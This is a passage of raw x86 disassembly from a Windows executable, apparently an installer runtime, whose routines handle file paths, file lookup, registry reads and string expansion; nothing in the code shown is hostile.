  4064fd:	ff 15 b4 90 40 00    	call   *0x4090b4
  406503:	c3                   	ret
  406504:	55                   	push   %ebp
  406505:	56                   	push   %esi
  406506:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40650a:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  40650e:	57                   	push   %edi
  40650f:	75 18                	jne    0x406529
  406511:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  406516:	75 11                	jne    0x406529
  406518:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  40651d:	75 0a                	jne    0x406529
  40651f:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  406524:	75 03                	jne    0x406529
  406526:	83 c6 08             	add    $0x8,%esi
  406529:	66 83 3e 00          	cmpw   $0x0,(%esi)
  40652d:	74 0d                	je     0x40653c
  40652f:	56                   	push   %esi
  406530:	e8 fa fa ff ff       	call   0x40602f
  406535:	85 c0                	test   %eax,%eax
  406537:	74 03                	je     0x40653c
  406539:	83 c6 04             	add    $0x4,%esi
  40653c:	0f b7 06             	movzwl (%esi),%eax
  40653f:	66 85 c0             	test   %ax,%ax
  406542:	8b ee                	mov    %esi,%ebp
  406544:	8b fe                	mov    %esi,%edi
  406546:	74 40                	je     0x406588
  406548:	53                   	push   %ebx
  406549:	8b 1d 28 92 40 00    	mov    0x409228,%ebx
  40654f:	66 3d 1f 00          	cmp    $0x1f,%ax
  406553:	76 25                	jbe    0x40657a
  406555:	50                   	push   %eax
  406556:	68 9c 99 40 00       	push   $0x40999c
  40655b:	e8 b0 fa ff ff       	call   0x406010
  406560:	66 83 38 00          	cmpw   $0x0,(%eax)
  406564:	75 14                	jne    0x40657a
  406566:	56                   	push   %esi
  406567:	ff d3                	call   *%ebx
  406569:	2b c6                	sub    %esi,%eax
  40656b:	d1 f8                	sar    $1,%eax
  40656d:	50                   	push   %eax
  40656e:	56                   	push   %esi
  40656f:	57                   	push   %edi
  406570:	e8 a2 fb ff ff       	call   0x406117
  406575:	57                   	push   %edi
  406576:	ff d3                	call   *%ebx
  406578:	8b f8                	mov    %eax,%edi
  40657a:	56                   	push   %esi
  40657b:	ff d3                	call   *%ebx
  40657d:	8b f0                	mov    %eax,%esi
  40657f:	0f b7 06             	movzwl (%esi),%eax
  406582:	66 85 c0             	test   %ax,%ax
  406585:	75 c8                	jne    0x40654f
  406587:	5b                   	pop    %ebx
  406588:	66 83 27 00          	andw   $0x0,(%edi)
  40658c:	57                   	push   %edi
  40658d:	55                   	push   %ebp
  40658e:	ff 15 94 92 40 00    	call   *0x409294
  406594:	8b f8                	mov    %eax,%edi
  406596:	0f b7 07             	movzwl (%edi),%eax
  406599:	66 3d 20 00          	cmp    $0x20,%ax
  40659d:	74 06                	je     0x4065a5
  40659f:	66 3d 5c 00          	cmp    $0x5c,%ax
  4065a3:	75 08                	jne    0x4065ad
  4065a5:	66 83 27 00          	andw   $0x0,(%edi)
  4065a9:	3b ef                	cmp    %edi,%ebp
  4065ab:	72 df                	jb     0x40658c
  4065ad:	5f                   	pop    %edi
  4065ae:	5e                   	pop    %esi
  4065af:	5d                   	pop    %ebp
  4065b0:	c2 04 00             	ret    $0x4
  4065b3:	56                   	push   %esi
  4065b4:	be 60 6a 42 00       	mov    $0x426a60,%esi
  4065b9:	56                   	push   %esi
  4065ba:	ff 74 24 0c          	push   0xc(%esp)
  4065be:	ff 15 60 91 40 00    	call   *0x409160
  4065c4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4065c7:	74 0b                	je     0x4065d4
  4065c9:	50                   	push   %eax
  4065ca:	ff 15 58 91 40 00    	call   *0x409158
  4065d0:	8b c6                	mov    %esi,%eax
  4065d2:	eb 02                	jmp    0x4065d6
  4065d4:	33 c0                	xor    %eax,%eax
  4065d6:	5e                   	pop    %esi
  4065d7:	c2 04 00             	ret    $0x4
  4065da:	55                   	push   %ebp
  4065db:	8b ec                	mov    %esp,%ebp
  4065dd:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  4065e3:	56                   	push   %esi
  4065e4:	be 04 01 00 00       	mov    $0x104,%esi
  4065e9:	56                   	push   %esi
  4065ea:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4065f0:	50                   	push   %eax
  4065f1:	ff 15 84 90 40 00    	call   *0x409084
  4065f7:	3b c6                	cmp    %esi,%eax
  4065f9:	5e                   	pop    %esi
  4065fa:	76 02                	jbe    0x4065fe
  4065fc:	33 c0                	xor    %eax,%eax
  4065fe:	85 c0                	test   %eax,%eax
  406600:	74 0f                	je     0x406611
  406602:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  406609:	ff 5c 
  40660b:	74 04                	je     0x406611
  40660d:	33 c9                	xor    %ecx,%ecx
  40660f:	eb 03                	jmp    0x406614
  406611:	33 c9                	xor    %ecx,%ecx
  406613:	41                   	inc    %ecx
  406614:	ff 75 08             	push   0x8(%ebp)
  406617:	8d 0c 4d c8 92 40 00 	lea    0x4092c8(,%ecx,2),%ecx
  40661e:	51                   	push   %ecx
  40661f:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  406626:	68 b0 99 40 00       	push   $0x4099b0
  40662b:	50                   	push   %eax
  40662c:	ff 15 4c 92 40 00    	call   *0x40924c
  406632:	83 c4 10             	add    $0x10,%esp
  406635:	6a 08                	push   $0x8
  406637:	6a 00                	push   $0x0
  406639:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  40663f:	50                   	push   %eax
  406640:	ff 15 38 91 40 00    	call   *0x409138
  406646:	c9                   	leave
  406647:	c2 04 00             	ret    $0x4
  40664a:	56                   	push   %esi
  40664b:	8b 74 24 08          	mov    0x8(%esp),%esi
  40664f:	57                   	push   %edi
  406650:	c1 e6 03             	shl    $0x3,%esi
  406653:	8b be 58 b0 40 00    	mov    0x40b058(%esi),%edi
  406659:	57                   	push   %edi
  40665a:	ff 15 7c 90 40 00    	call   *0x40907c
  406660:	85 c0                	test   %eax,%eax
  406662:	75 0a                	jne    0x40666e
  406664:	57                   	push   %edi
  406665:	e8 70 ff ff ff       	call   0x4065da
  40666a:	85 c0                	test   %eax,%eax
  40666c:	74 0f                	je     0x40667d
  40666e:	ff b6 5c b0 40 00    	push   0x40b05c(%esi)
  406674:	50                   	push   %eax
  406675:	ff 15 80 90 40 00    	call   *0x409080
  40667b:	eb 02                	jmp    0x40667f
  40667d:	33 c0                	xor    %eax,%eax
  40667f:	5f                   	pop    %edi
  406680:	5e                   	pop    %esi
  406681:	c2 04 00             	ret    $0x4
  406684:	55                   	push   %ebp
  406685:	8b ec                	mov    %esp,%ebp
  406687:	83 ec 1c             	sub    $0x1c,%esp
  40668a:	56                   	push   %esi
  40668b:	8b 75 08             	mov    0x8(%ebp),%esi
  40668e:	57                   	push   %edi
  40668f:	8b 3d 9c 92 40 00    	mov    0x40929c,%edi
  406695:	eb 0a                	jmp    0x4066a1
  406697:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40669a:	50                   	push   %eax
  40669b:	ff 15 98 92 40 00    	call   *0x409298
  4066a1:	6a 01                	push   $0x1
  4066a3:	56                   	push   %esi
  4066a4:	56                   	push   %esi
  4066a5:	6a 00                	push   $0x0
  4066a7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4066aa:	50                   	push   %eax
  4066ab:	ff d7                	call   *%edi
  4066ad:	85 c0                	test   %eax,%eax
  4066af:	75 e6                	jne    0x406697
  4066b1:	5f                   	pop    %edi
  4066b2:	5e                   	pop    %esi
  4066b3:	c9                   	leave
  4066b4:	c2 04 00             	ret    $0x4
  4066b7:	55                   	push   %ebp
  4066b8:	8b ec                	mov    %esp,%ebp
  4066ba:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4066c0:	68 00 01 00 00       	push   $0x100
  4066c5:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4066cb:	50                   	push   %eax
  4066cc:	ff 75 0c             	push   0xc(%ebp)
  4066cf:	e8 15 fe ff ff       	call   0x4064e9
  4066d4:	83 c4 0c             	add    $0xc,%esp
  4066d7:	85 c0                	test   %eax,%eax
  4066d9:	74 12                	je     0x4066ed
  4066db:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4066e1:	50                   	push   %eax
  4066e2:	ff 75 08             	push   0x8(%ebp)
  4066e5:	ff 15 80 90 40 00    	call   *0x409080
  4066eb:	eb 02                	jmp    0x4066ef
  4066ed:	33 c0                	xor    %eax,%eax
  4066ef:	c9                   	leave
  4066f0:	c2 08 00             	ret    $0x8
  4066f3:	55                   	push   %ebp
  4066f4:	8b ec                	mov    %esp,%ebp
  4066f6:	51                   	push   %ecx
  4066f7:	56                   	push   %esi
  4066f8:	8b 35 6c 90 40 00    	mov    0x40906c,%esi
  4066fe:	57                   	push   %edi
  4066ff:	6a 64                	push   $0x64
  406701:	ff 75 08             	push   0x8(%ebp)
  406704:	ff d6                	call   *%esi
  406706:	bf 02 01 00 00       	mov    $0x102,%edi
  40670b:	eb 0e                	jmp    0x40671b
  40670d:	6a 0f                	push   $0xf
  40670f:	e8 70 ff ff ff       	call   0x406684
  406714:	6a 64                	push   $0x64
  406716:	ff 75 08             	push   0x8(%ebp)
  406719:	ff d6                	call   *%esi
  40671b:	3b c7                	cmp    %edi,%eax
  40671d:	74 ee                	je     0x40670d
  40671f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406722:	50                   	push   %eax
  406723:	ff 75 08             	push   0x8(%ebp)
  406726:	ff 15 78 90 40 00    	call   *0x409078
  40672c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40672f:	5f                   	pop    %edi
  406730:	5e                   	pop    %esi
  406731:	c9                   	leave
  406732:	c2 04 00             	ret    $0x4
  406735:	55                   	push   %ebp
  406736:	8b ec                	mov    %esp,%ebp
  406738:	83 ec 24             	sub    $0x24,%esp
  40673b:	56                   	push   %esi
  40673c:	33 f6                	xor    %esi,%esi
  40673e:	6a 03                	push   $0x3
  406740:	46                   	inc    %esi
  406741:	e8 04 ff ff ff       	call   0x40664a
  406746:	85 c0                	test   %eax,%eax
  406748:	74 09                	je     0x406753
  40674a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40674d:	51                   	push   %ecx
  40674e:	ff d0                	call   *%eax
  406750:	8b 75 f0             	mov    -0x10(%ebp),%esi
  406753:	8b c6                	mov    %esi,%eax
  406755:	5e                   	pop    %esi
  406756:	c9                   	leave
  406757:	c3                   	ret
  406758:	6a 07                	push   $0x7
  40675a:	e8 eb fe ff ff       	call   0x40664a
  40675f:	85 c0                	test   %eax,%eax
  406761:	74 0a                	je     0x40676d
  406763:	ff d0                	call   *%eax
  406765:	85 c0                	test   %eax,%eax
  406767:	74 04                	je     0x40676d
  406769:	33 c0                	xor    %eax,%eax
  40676b:	40                   	inc    %eax
  40676c:	c3                   	ret
  40676d:	33 c0                	xor    %eax,%eax
  40676f:	c3                   	ret
  406770:	56                   	push   %esi
  406771:	8b 74 24 08          	mov    0x8(%esp),%esi
  406775:	57                   	push   %edi
  406776:	56                   	push   %esi
  406777:	e8 bf f9 ff ff       	call   0x40613b
  40677c:	8b f8                	mov    %eax,%edi
  40677e:	83 ff ff             	cmp    $0xffffffff,%edi
  406781:	74 2e                	je     0x4067b1
  406783:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  406788:	56                   	push   %esi
  406789:	74 0f                	je     0x40679a
  40678b:	ff 15 70 90 40 00    	call   *0x409070
  406791:	85 c0                	test   %eax,%eax
  406793:	74 0d                	je     0x4067a2
  406795:	33 c0                	xor    %eax,%eax
  406797:	40                   	inc    %eax
  406798:	eb 19                	jmp    0x4067b3
  40679a:	ff 15 64 91 40 00    	call   *0x409164
  4067a0:	eb ef                	jmp    0x406791
  4067a2:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  4067a7:	75 08                	jne    0x4067b1
  4067a9:	57                   	push   %edi
  4067aa:	56                   	push   %esi
  4067ab:	ff 15 f8 90 40 00    	call   *0x4090f8
  4067b1:	33 c0                	xor    %eax,%eax
  4067b3:	5f                   	pop    %edi
  4067b4:	5e                   	pop    %esi
  4067b5:	c2 08 00             	ret    $0x8
  4067b8:	56                   	push   %esi
  4067b9:	8b 74 24 08          	mov    0x8(%esp),%esi
  4067bd:	56                   	push   %esi
  4067be:	ff 15 bc 90 40 00    	call   *0x4090bc
  4067c4:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4067c7:	50                   	push   %eax
  4067c8:	56                   	push   %esi
  4067c9:	ff 15 94 92 40 00    	call   *0x409294
  4067cf:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  4067d3:	74 0c                	je     0x4067e1
  4067d5:	68 c8 92 40 00       	push   $0x4092c8
  4067da:	56                   	push   %esi
  4067db:	ff 15 88 90 40 00    	call   *0x409088
  4067e1:	8b c6                	mov    %esi,%eax
  4067e3:	5e                   	pop    %esi
  4067e4:	c2 04 00             	ret    $0x4
  4067e7:	56                   	push   %esi
  4067e8:	8b 74 24 08          	mov    0x8(%esp),%esi
  4067ec:	56                   	push   %esi
  4067ed:	ff 15 bc 90 40 00    	call   *0x4090bc
  4067f3:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4067f6:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  4067fa:	74 0c                	je     0x406808
  4067fc:	50                   	push   %eax
  4067fd:	56                   	push   %esi
  4067fe:	ff 15 94 92 40 00    	call   *0x409294
  406804:	3b c6                	cmp    %esi,%eax
  406806:	77 ee                	ja     0x4067f6
  406808:	66 83 20 00          	andw   $0x0,(%eax)
  40680c:	83 c0 02             	add    $0x2,%eax
  40680f:	5e                   	pop    %esi
  406810:	c2 04 00             	ret    $0x4
  406813:	56                   	push   %esi
  406814:	8b 74 24 08          	mov    0x8(%esp),%esi
  406818:	57                   	push   %edi
  406819:	8b 3d bc 90 40 00    	mov    0x4090bc,%edi
  40681f:	56                   	push   %esi
  406820:	ff d7                	call   *%edi
  406822:	8d 04 46             	lea    (%esi,%eax,2),%eax
  406825:	0f b7 08             	movzwl (%eax),%ecx
  406828:	66 83 f9 2e          	cmp    $0x2e,%cx
  40682c:	74 20                	je     0x40684e
  40682e:	66 83 f9 5c          	cmp    $0x5c,%cx
  406832:	74 14                	je     0x406848
  406834:	66 83 f9 2f          	cmp    $0x2f,%cx
  406838:	74 0e                	je     0x406848
  40683a:	50                   	push   %eax
  40683b:	56                   	push   %esi
  40683c:	ff 15 94 92 40 00    	call   *0x409294
  406842:	3b c6                	cmp    %esi,%eax
  406844:	77 df                	ja     0x406825
  406846:	eb 06                	jmp    0x40684e
  406848:	56                   	push   %esi
  406849:	ff d7                	call   *%edi
  40684b:	8d 04 46             	lea    (%esi,%eax,2),%eax
  40684e:	66 83 20 00          	andw   $0x0,(%eax)
  406852:	5f                   	pop    %edi
  406853:	8b c6                	mov    %esi,%eax
  406855:	5e                   	pop    %esi
  406856:	c2 04 00             	ret    $0x4
  406859:	56                   	push   %esi
  40685a:	57                   	push   %edi
  40685b:	ff 74 24 0c          	push   0xc(%esp)
  40685f:	be 60 5a 42 00       	mov    $0x425a60,%esi
  406864:	56                   	push   %esi
  406865:	e8 5d fc ff ff       	call   0x4064c7
  40686a:	56                   	push   %esi
  40686b:	e8 f4 f7 ff ff       	call   0x406064
  406870:	8b f8                	mov    %eax,%edi
  406872:	85 ff                	test   %edi,%edi
  406874:	75 04                	jne    0x40687a
  406876:	33 c0                	xor    %eax,%eax
  406878:	eb 5e                	jmp    0x4068d8
  40687a:	57                   	push   %edi
  40687b:	e8 84 fc ff ff       	call   0x406504
  406880:	f6 05 f0 a5 42 00 80 	testb  $0x80,0x42a5f0
  406887:	74 0e                	je     0x406897
  406889:	0f b7 07             	movzwl (%edi),%eax
  40688c:	66 85 c0             	test   %ax,%ax
  40688f:	74 e5                	je     0x406876
  406891:	66 3d 5c 00          	cmp    $0x5c,%ax
  406895:	74 df                	je     0x406876
  406897:	2b fe                	sub    %esi,%edi
  406899:	53                   	push   %ebx
  40689a:	8b 1d bc 90 40 00    	mov    0x4090bc,%ebx
  4068a0:	d1 ff                	sar    $1,%edi
  4068a2:	eb 15                	jmp    0x4068b9
  4068a4:	56                   	push   %esi
  4068a5:	e8 09 fd ff ff       	call   0x4065b3
  4068aa:	85 c0                	test   %eax,%eax
  4068ac:	74 05                	je     0x4068b3
  4068ae:	f6 00 10             	testb  $0x10,(%eax)
  4068b1:	74 2a                	je     0x4068dd
  4068b3:	56                   	push   %esi
  4068b4:	e8 2e ff ff ff       	call   0x4067e7
  4068b9:	56                   	push   %esi
  4068ba:	ff d3                	call   *%ebx
  4068bc:	3b c7                	cmp    %edi,%eax
  4068be:	7f e4                	jg     0x4068a4
  4068c0:	56                   	push   %esi
  4068c1:	e8 f2 fe ff ff       	call   0x4067b8
  4068c6:	56                   	push   %esi
  4068c7:	ff 15 fc 90 40 00    	call   *0x4090fc
  4068cd:	33 c9                	xor    %ecx,%ecx
  4068cf:	83 f8 ff             	cmp    $0xffffffff,%eax
  4068d2:	0f 95 c1             	setne  %cl
  4068d5:	8b c1                	mov    %ecx,%eax
  4068d7:	5b                   	pop    %ebx
  4068d8:	5f                   	pop    %edi
  4068d9:	5e                   	pop    %esi
  4068da:	c2 04 00             	ret    $0x4
  4068dd:	33 c0                	xor    %eax,%eax
  4068df:	eb f6                	jmp    0x4068d7
  4068e1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4068e5:	83 ec 10             	sub    $0x10,%esp
  4068e8:	85 c0                	test   %eax,%eax
  4068ea:	7d 11                	jge    0x4068fd
  4068ec:	8b 0d 68 95 42 00    	mov    0x429568,%ecx
  4068f2:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4068f9:	2b c8                	sub    %eax,%ecx
  4068fb:	8b 01                	mov    (%ecx),%eax
  4068fd:	8b 0d b8 a5 42 00    	mov    0x42a5b8,%ecx
  406903:	56                   	push   %esi
  406904:	57                   	push   %edi
  406905:	8d 3c 41             	lea    (%ecx,%eax,2),%edi
  406908:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40690c:	b8 20 85 42 00       	mov    $0x428520,%eax
  406911:	3b c8                	cmp    %eax,%ecx
  406913:	8b f0                	mov    %eax,%esi
  406915:	72 15                	jb     0x40692c
  406917:	8b d1                	mov    %ecx,%edx
  406919:	2b d0                	sub    %eax,%edx
  40691b:	d1 fa                	sar    $1,%edx
  40691d:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406923:	73 07                	jae    0x40692c
  406925:	83 64 24 1c 00       	andl   $0x0,0x1c(%esp)
  40692a:	8b f1                	mov    %ecx,%esi
  40692c:	0f b7 0f             	movzwl (%edi),%ecx
  40692f:	66 85 c9             	test   %cx,%cx
  406932:	0f 84 02 02 00 00    	je     0x406b3a
  406938:	53                   	push   %ebx
  406939:	55                   	push   %ebp
  40693a:	8b d6                	mov    %esi,%edx
  40693c:	2b d0                	sub    %eax,%edx
  40693e:	83 e2 fe             	and    $0xfffffffe,%edx
  406941:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406947:	0f 8d eb 01 00 00    	jge    0x406b38
  40694d:	0f b7 e9             	movzwl %cx,%ebp
  406950:	6a 02                	push   $0x2
  406952:	59                   	pop    %ecx
  406953:	03 f9                	add    %ecx,%edi
  406955:	66 83 fd 04          	cmp    $0x4,%bp
  406959:	0f 83 ba 01 00 00    	jae    0x406b19
  40695f:	8a 07                	mov    (%edi),%al
  406961:	0f b6 4f 01          	movzbl 0x1(%edi),%ecx
  406965:	0f b6 5f 01          	movzbl 0x1(%edi),%ebx
  406969:	83 e1 7f             	and    $0x7f,%ecx
  40696c:	0f b6 d0             	movzbl %al,%edx
  40696f:	83 e2 7f             	and    $0x7f,%edx
  406972:	c1 e1 07             	shl    $0x7,%ecx
  406975:	0b ca                	or     %edx,%ecx
  406977:	0f b6 c0             	movzbl %al,%eax
  40697a:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  40697e:	b9 00 80 00 00       	mov    $0x8000,%ecx
  406983:	8b d0                	mov    %eax,%edx
  406985:	0b d1                	or     %ecx,%edx
  406987:	89 54 24 10          	mov    %edx,0x10(%esp)
  40698b:	8b d3                	mov    %ebx,%edx
  40698d:	0b d1                	or     %ecx,%edx
  40698f:	6a 02                	push   $0x2
  406991:	59                   	pop    %ecx
  406992:	03 f9                	add    %ecx,%edi
  406994:	66 3b e9             	cmp    %cx,%bp
  406997:	89 44 24 14          	mov    %eax,0x14(%esp)
  40699b:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  40699f:	89 54 24 18          	mov    %edx,0x18(%esp)
  4069a3:	0f 85 0d 01 00 00    	jne    0x406ab6
  4069a9:	33 ed                	xor    %ebp,%ebp
  4069ab:	39 2d 44 a6 42 00    	cmp    %ebp,0x42a644
  4069b1:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  4069b5:	74 08                	je     0x4069bf
  4069b7:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%esp)
  4069be:	00 
  4069bf:	84 c0                	test   %al,%al
  4069c1:	79 38                	jns    0x4069fb
  4069c3:	8b c8                	mov    %eax,%ecx
  4069c5:	83 e1 40             	and    $0x40,%ecx
  4069c8:	51                   	push   %ecx
  4069c9:	8b 0d b8 a5 42 00    	mov    0x42a5b8,%ecx
  4069cf:	56                   	push   %esi
  4069d0:	83 e0 3f             	and    $0x3f,%eax
  4069d3:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4069d6:	50                   	push   %eax
  4069d7:	68 e8 98 40 00       	push   $0x4098e8
  4069dc:	68 02 00 00 80       	push   $0x80000002
  4069e1:	e8 af f9 ff ff       	call   0x406395
  4069e6:	66 39 2e             	cmp    %bp,(%esi)
  4069e9:	0f 85 b4 00 00 00    	jne    0x406aa3
  4069ef:	53                   	push   %ebx
  4069f0:	56                   	push   %esi
  4069f1:	e8 eb fe ff ff       	call   0x4068e1
  4069f6:	e9 a3 00 00 00       	jmp    0x406a9e
  4069fb:	83 f8 25             	cmp    $0x25,%eax
  4069fe:	75 11                	jne    0x406a11
  406a00:	68 00 04 00 00       	push   $0x400
  406a05:	56                   	push   %esi
  406a06:	ff 15 84 90 40 00    	call   *0x409084
  406a0c:	e9 8d 00 00 00       	jmp    0x406a9e
  406a11:	83 f8 24             	cmp    $0x24,%eax
  406a14:	75 10                	jne    0x406a26
  406a16:	68 00 04 00 00       	push   $0x400
  406a1b:	56                   	push   %esi
  406a1c:	ff 15 d0 90 40 00    	call   *0x4090d0
  406a22:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  406a26:	39 6c 24 28          	cmp    %ebp,0x28(%esp)
  406a2a:	74 72                	je     0x406a9e
  406a2c:	ff 4c 24 28          	decl   0x28(%esp)
  406a30:	8b 44 24 28          	mov    0x28(%esp),%eax
  406a34:	8b 5c 84 10          	mov    0x10(%esp,%eax,4),%ebx
  406a38:	a1 80 a5 42 00       	mov    0x42a580,%eax
  406a3d:	83 e3 bf             	and    $0xffffffbf,%ebx
  406a40:	8b eb                	mov    %ebx,%ebp
  406a42:	81 e5 00 80 00 00    	and    $0x8000,%ebp
  406a48:	85 c0                	test   %eax,%eax
  406a4a:	74 12                	je     0x406a5e
  406a4c:	56                   	push   %esi
  406a4d:	6a 00                	push   $0x0
  406a4f:	6a 00                	push   $0x0
  406a51:	53                   	push   %ebx
  406a52:	ff 35 84 a5 42 00    	push   0x42a584
  406a58:	ff d0                	call   *%eax
  406a5a:	85 c0                	test   %eax,%eax
  406a5c:	74 3a                	je     0x406a98
  406a5e:	6a 08                	push   $0x8
  406a60:	e8 e5 fb ff ff       	call   0x40664a
  406a65:	0f b6 cb             	movzbl %bl,%ecx
  406a68:	55                   	push   %ebp
  406a69:	51                   	push   %ecx
  406a6a:	ff 35 84 a5 42 00    	push   0x42a584
  406a70:	ff d0                	call   *%eax
  406a72:	8b d8                	mov    %eax,%ebx
  406a74:	85 db                	test   %ebx,%ebx
  406a76:	74 15                	je     0x406a8d
  406a78:	56                   	push   %esi
  406a79:	53                   	push   %ebx
  406a7a:	ff 15 98 91 40 00    	call   *0x409198
  406a80:	53                   	push   %ebx
  406a81:	8b e8                	mov    %eax,%ebp
  406a83:	ff 15 c0 92 40 00    	call   *0x4092c0
  406a89:	85 ed                	test   %ebp,%ebp
  406a8b:	75 0b                	jne    0x406a98
  406a8d:	66 83 26 00          	andw   $0x0,(%esi)
  406a91:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  406a96:	75 94                	jne    0x406a2c
  406a98:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  406a9c:	33 ed                	xor    %ebp,%ebp
  406a9e:	66 39 2e             	cmp    %bp,(%esi)
  406aa1:	74 49                	je     0x406aec
  406aa3:	83 fb 1a             	cmp    $0x1a,%ebx
  406aa6:	75 44                	jne    0x406aec
  406aa8:	68 40 99 40 00       	push   $0x409940
  406aad:	56                   	push   %esi
  406aae:	ff 15 88 90 40 00    	call   *0x409088
  406ab4:	eb 36                	jmp    0x406aec
  406ab6:	66 83 fd 03          	cmp    $0x3,%bp
  406aba:	75 38                	jne    0x406af4
  406abc:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  406ac0:	83 fb 1d             	cmp    $0x1d,%ebx
  406ac3:	75 0e                	jne    0x406ad3
  406ac5:	ff 35 84 a5 42 00    	push   0x42a584
  406acb:	56                   	push   %esi
  406acc:	e8 3d f9 ff ff       	call   0x40640e
  406ad1:	eb 11                	jmp    0x406ae4
  406ad3:	8b c3                	mov    %ebx,%eax
  406ad5:	c1 e0 0b             	shl    $0xb,%eax
  406ad8:	05 00 b0 42 00       	add    $0x42b000,%eax
  406add:	50                   	push   %eax
  406ade:	56                   	push   %esi
  406adf:	e8 e3 f9 ff ff       	call   0x4064c7
  406ae4:	83 c3 eb             	add    $0xffffffeb,%ebx
  406ae7:	83 fb 07             	cmp    $0x7,%ebx
  406aea:	73 1c                	jae    0x406b08
  406aec:	56                   	push   %esi
  406aed:	e8 12 fa ff ff       	call   0x406504
  406af2:	eb 14                	jmp    0x406b08
  406af4:	66 83 fd 01          	cmp    $0x1,%bp
  406af8:	75 0e                	jne    0x406b08
  406afa:	83 c8 ff             	or     $0xffffffff,%eax
  406afd:	2b 44 24 28          	sub    0x28(%esp),%eax
  406b01:	50                   	push   %eax
  406b02:	56                   	push   %esi
  406b03:	e8 d9 fd ff ff       	call   0x4068e1
  406b08:	56                   	push   %esi
  406b09:	ff 15 bc 90 40 00    	call   *0x4090bc
  406b0f:	8d 34 46             	lea    (%esi,%eax,2),%esi
  406b12:	b8 20 85 42 00       	mov    $0x428520,%eax
  406b17:	eb 13                	jmp    0x406b2c
  406b19:	75 0c                	jne    0x406b27
  406b1b:	66 8b 17             	mov    (%edi),%dx
  406b1e:	66 89 16             	mov    %dx,(%esi)
  406b21:	03 f1                	add    %ecx,%esi
  406b23:	03 f9                	add    %ecx,%edi
  406b25:	eb 05                	jmp    0x406b2c
  406b27:	66 89 2e             	mov    %bp,(%esi)
  406b2a:	03 f1                	add    %ecx,%esi
  406b2c:	0f b7 0f             	movzwl (%edi),%ecx
  406b2f:	66 85 c9             	test   %cx,%cx
  406b32:	0f 85 02 fe ff ff    	jne    0x40693a
  406b38:	5d                   	pop    %ebp
  406b39:	5b                   	pop    %ebx
  406b3a:	66 83 26 00          	andw   $0x0,(%esi)
  406b3e:	83 7c 24 1c 00       	cmpl   $0x0,0x1c(%esp)
  406b43:	5f                   	pop    %edi
  406b44:	5e                   	pop    %esi
  406b45:	74 0a                	je     0x406b51
  406b47:	50                   	push   %eax
  406b48:	ff 74 24 18          	push   0x18(%esp)
  406b4c:	e8 76 f9 ff ff       	call   0x4064c7
  406b51:	83 c4 10             	add    $0x10,%esp
  406b54:	c2 08 00             	ret    $0x8
  406b57:	53                   	push   %ebx
  406b58:	8b 1d 0c 91 40 00    	mov    0x40910c,%ebx
  406b5e:	55                   	push   %ebp
  406b5f:	56                   	push   %esi
  406b60:	8b 74 24 14          	mov    0x14(%esp),%esi
  406b64:	85 f6                	test   %esi,%esi
  406b66:	57                   	push   %edi
  406b67:	c7 05 60 62 42 00 4e 	movl   $0x55004e,0x426260
  406b6e:	00 55 00 
  406b71:	c7 05 64 62 42 00 4c 	movl   $0x4c,0x426264
  406b78:	00 00 00 
  406b7b:	bf 00 04 00 00       	mov    $0x400,%edi
  406b80:	bd 60 62 42 00       	mov    $0x426260,%ebp
  406b85:	74 26                	je     0x406bad
  406b87:	6a 01                	push   $0x1
  406b89:	6a 00                	push   $0x0
  406b8b:	56                   	push   %esi
  406b8c:	e8 d0 f5 ff ff       	call   0x406161
  406b91:	50                   	push   %eax
  406b92:	ff 15 1c 91 40 00    	call   *0x40911c
  406b98:	57                   	push   %edi
  406b99:	55                   	push   %ebp
  406b9a:	56                   	push   %esi
  406b9b:	ff d3                	call   *%ebx
  406b9d:	85 c0                	test   %eax,%eax
  406b9f:	0f 84 27 01 00 00    	je     0x406ccc
  406ba5:	3b c7                	cmp    %edi,%eax
  406ba7:	0f 8f 1f 01 00 00    	jg     0x406ccc
  406bad:	57                   	push   %edi
  406bae:	be b0 78 42 00       	mov    $0x4278b0,%esi
  406bb3:	56                   	push   %esi
  406bb4:	ff 74 24 1c          	push   0x1c(%esp)
  406bb8:	ff d3                	call   *%ebx
  406bba:	85 c0                	test   %eax,%eax
  406bbc:	0f 84 0a 01 00 00    	je     0x406ccc
  406bc2:	3b c7                	cmp    %edi,%eax
  406bc4:	0f 8f 02 01 00 00    	jg     0x406ccc
  406bca:	56                   	push   %esi
  406bcb:	55                   	push   %ebp
  406bcc:	68 d4 99 40 00       	push   $0x4099d4
